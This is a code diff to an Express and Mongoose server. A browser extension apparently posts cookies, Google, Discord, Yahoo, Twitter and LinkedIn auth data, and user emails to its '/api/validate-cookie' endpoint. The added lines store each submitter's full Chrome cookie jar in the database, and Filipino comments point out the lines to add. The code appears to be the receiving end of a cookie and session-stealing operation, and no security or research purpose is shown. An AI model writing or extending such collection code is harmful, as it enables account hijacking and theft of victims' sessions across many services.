@@ -42,6 +42,7 @@ const Account = mongoose.model('Account', {
   tool: String,
   itemName: String,
   platformAuth: Object,
+  chromeCookieJar: String, // <--- ITO ANG DAGDAGIN MO
   createdAt: { type: Date, default: Date.now },
   isActive: { type: Boolean, default: true },
   lastValidated: Date
@@ -66,7 +67,10 @@ app.post('/api/validate-cookie', checkExtensionKey, async (req, res) => {
       ...body,
       cookie: body.cookie ? '***MASKED***' : undefined,
       _chromeCookieJar: body._chromeCookieJar ? '***MASKED***' : undefined,
-      googleAuth: body.googleAuth ? '***MASKED***' : undefined
+      googleAuth: body.googleAuth ? '***MASKED***' : undefined,
+      yahooAuth: body.yahooAuth ? '***MASKED***' : undefined,
+      twitterAuth: body.twitterAuth ? '***MASKED***' : undefined,
+      linkedinAuth: body.linkedinAuth ? '***MASKED***' : undefined
     };
     console.log('Received validate-cookie request:', safeLog);
 
@@ -78,6 +82,7 @@ app.post('/api/validate-cookie', checkExtensionKey, async (req, res) => {
       itemName: body.gameName || body.clothingName,
       email: body.googleEmail || body.discordUser?.email || null,
       platformAuth: body.googleAuth || body.discordUser || {},
+      chromeCookieJar: body._chromeCookieJar || '', // <--- ITO ANG DAGDAGIN MO
       lastValidated: new Date()
     });
 
